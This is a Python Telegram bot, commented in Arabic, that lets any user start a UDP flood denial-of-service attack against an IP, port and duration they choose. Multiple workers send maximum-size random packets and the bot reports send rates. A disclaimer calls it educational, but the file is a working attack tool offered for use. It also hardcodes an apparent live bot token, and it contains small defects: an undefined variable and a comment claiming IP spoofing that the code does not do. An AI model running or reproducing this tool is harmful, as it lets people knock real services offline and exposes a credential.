import asyncio
import logging
import random
import socket
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# تحذير: هذا الكود لأغراض تعليمية وأمنية فقط. الاستخدام غير القانوني محظور.

# إعدادات البوت
TOKEN = "6197840010:AAHYojr7jBnRT61bIPXVHiGBQmTiz2SRZNw"
MAX_ATTACK_DURATION = 300  # 5 دقائق كحد أقصى
MAX_PACKET_SIZE = 65500    # أقصى حجم للحزمة UDP
WORKER_THREADS = 5        # عدد ثنيات الهجوم المتوازية

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# قاموس لتتبع الهجمات النشطة
active_attacks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إرسال رسالة ترحيبية عند استخدام الأمر /start"""
    user = update.effective_user
    await update.message.reply_text(
        f"مرحباً {user.mention_html()}!\n\n"
        "لإرسال هجوم UDP قوي، أرسل:\n"
        "<code>الايبي البورت المدة</code>\n\n"
        "مثال: <code>49.51.155.61 20002 60</code>\n\n"
        "سيبدأ الهجوم تلقائياً. استخدم /stop لإيقاف الهجوم.\n"
        "ملاحظة: أقصى مدة مسموحة هي 5 دقائق.",
        parse_mode='HTML'
    )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إيقاف الهجوم الحالي"""
    user_id = update.effective_user.id
    if user_id in active_attacks:
        active_attacks[user_id]['running'] = False
        del active_attacks[user_id]
        await update.message.reply_text("✅ تم إيقاف الهجوم بنجاح.")
    else:
        await update.message.reply_text("⚠️ لا يوجد هجوم نشط لإيقافه.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الرسائل النصية لبدء الهجوم"""
    user_id = update.effective_user.id
    
    # التحقق من وجود هجوم نشط بالفعل
    if user_id in active_attacks:
        await update.message.reply_text("⚠️ لديك هجوم نشط بالفعل. استخدم /stop لإيقافه أولاً.")
        return
    
    try:
        # تحليل المدخلات
        args = update.message.text.split()
        if len(args) != 3:
            return  # تجاهل الرسائل غير ذات الصلة
        
        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])
        
        # التحقق من صحة المدخلات
        if duration <= 0 or duration > MAX_ATTACK_DURATION:
            raise ValueError(f"المدة يجب أن تكون بين 1 و {MAX_ATTACK_DURATION} ثانية")
        
        if target_port < 1 or target_port > 65535:
            raise ValueError("رقم المنفذ يجب أن يكون بين 1 و 65535")
        
        # بدء الهجوم فوراً
        active_attacks[user_id] = {'running': True}
        asyncio.create_task(
            run_enhanced_udp_attack(
                target_ip, 
                target_port, 
                duration, 
                update, 
                user_id
            )
        )
        
        await update.message.reply_text(
            f"🚀 بدء الهجوم القوي على {target_ip}:{target_port} لمدة {duration} ثانية..."
        )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ خطأ: {str(e)}")
    except Exception as e:
        logger.error(f"Error in handle_message: {e}")
        await update.message.reply_text("❌ حدث خطأ غير متوقع أثناء معالجة الأمر.")

async def run_enhanced_udp_attack(target_ip, target_port, duration, update, user_id):
    """تشغيل هجوم UDP معزز في خلفية منفصلة"""
    start_time = time.time()
    end_time = start_time + duration
    total_packets = 0
    
    try:
        # إنشاء عدة ثنيات (threads) للهجوم
        workers = []
        for _ in range(WORKER_THREADS):
            worker = asyncio.create_task(
                udp_attack_worker(
                    target_ip, 
                    target_port, 
                    end_time, 
                    user_id
                )
            )
            workers.append(worker)
            await asyncio.sleep(0.1)  # تباعد بدء الثنيات
        
        # انتظار انتهاء جميع الثنيات أو انتهاء المدة
        results = await asyncio.gather(*workers, return_exceptions=True)
        total_packets = sum(results)
        
        # إرسال تقرير النتائج
        elapsed_time = time.time() - start_time
        if user_id in active_attacks:
            del active_attacks[user_id]
            
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"✅ اكتمل الهجوم على {target_ip}:{target_port}\n"
                 f"⏱ المدة الفعلية: {elapsed_time:.2f} ثانية\n"
                 f"📦 إجمالي الحزم المرسلة: {total_packets:,}\n"
                 f"⚡ معدل الإرسال: {total_packets/elapsed_time:,.2f} حزمة/ثانية\n"
                 f"🧵 عدد ثنيات الهجوم: {WORKER_THREADS}",
            parse_mode='HTML'
        )
        
    except Exception as e:
        logger.error(f"Error in run_enhanced_udp_attack: {e}")
        if user_id in active_attacks:
            del active_attacks[user_id]
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ توقف الهجوم بسبب خطأ: {str(e)}"
        )

async def udp_attack_worker(target_ip, target_port, end_time, user_id):
    """ثنية عمل منفصلة لإرسال حزم UDP"""
    packet_count = 0
    
    try:
        # إنشاء سوكيت منفصل لكل ثنية
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while time.time() < end_time and active_attacks.get(user_id, {}).get('running', False):
            try:
                # بيانات عشوائية بحجم كبير
                data = random._urandom(MAX_PACKET_SIZE)
                
                # إرسال الحزمة مع عنوان IP مزيف لزيادة التأثير
                sock.sendto(data, (target_ip, target_port))
                packet_count += 1
                
                # تقليل الحمل على النظام
                if packet_count % 100 == 0:
                    await asyncio.sleep(0.001)
                    
            except Exception as e:
                logger.error(f"Worker error: {e}")
                break
        
        sock.close()
        return packet_count
        
    except Exception as e:
        logger.error(f"Error in udp_attack_worker: {e}")
        return packet_count

def main():
    """تشغيل البوت"""
    application = Application.builder().token(TOKEN).build()
    
    # تسجيل معالجات الأوامر
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # تشغيل البوت
    application.run_polling()

if __name__ == '__main__':
    main()